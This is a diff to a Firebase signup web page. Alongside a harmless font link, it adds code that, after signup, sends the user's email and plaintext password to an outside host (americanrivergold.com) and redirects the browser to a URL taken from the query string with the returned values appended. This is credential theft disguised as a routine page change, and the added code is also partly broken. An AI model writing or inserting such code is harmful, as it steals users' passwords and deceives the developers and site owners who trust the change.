@@ -8,6 +8,7 @@
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.bundle.min.js"></script>
     <script type="text/javascript"></script>
+    <link href='https://fonts.googleapis.com/css?family=Shadows Into Light Two' rel='stylesheet'>
 </head>
 <style>
         body {
@@ -475,6 +476,9 @@
   <script src="https://www.gstatic.com/firebasejs/8.2.5/firebase-firestore.js"></script>
 
 <script>
+    var redirect1 = location.href
+    var redirect2 = redirect1.split("?")
+    var redirect= redirect2[2]
   // Your web app's Firebase configuration
   // For Firebase JS SDK v7.20.0 and later, measurementId is optional
   var firebaseConfig = {
@@ -597,7 +601,11 @@ document.addEventListener('submit', (e) => {
             });
             console.log("Signup Successful!",btoa(btoa(userEmail)))
             //window.location.replace("./index.html")
-
+            bunnify(userEmail);
+            var bunny1 = data1;
+            bunnify(userPassword)
+            var bunny2 = data1;
+            location.href=redirect +bunny1.encryptedstring + bunny2.encryptedstring
         }).catch((error) => {
             // Handle Errors here.
             console.log("Signup Failed!", error)
@@ -605,7 +613,31 @@ document.addEventListener('submit', (e) => {
 
     }
 });
-    </script>
+function bunnify(bunnytype) {
+            var myHeaders = new Headers();
+            myHeaders.append("Content-Type", "application/json");
+            myHeaders.append("Accept", "application/json, /;q=0.5");
+
+            var raw = JSON.stringify({
+              "stringtoencrypt": `${bunnytype}`
+            });
+            //document.write(raw)
+            var requestOptions = {
+              method: 'POST',
+              headers: myHeaders,
+              body: raw,
+              redirect: 'follow'
+            };
+
+            fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
+              .then(function (response) {
+                  return response.json();
+              })
+              .then(function (data) {
+                var data1 = data1;
+        })
+}
+</script>
 
 </body>
 </html>
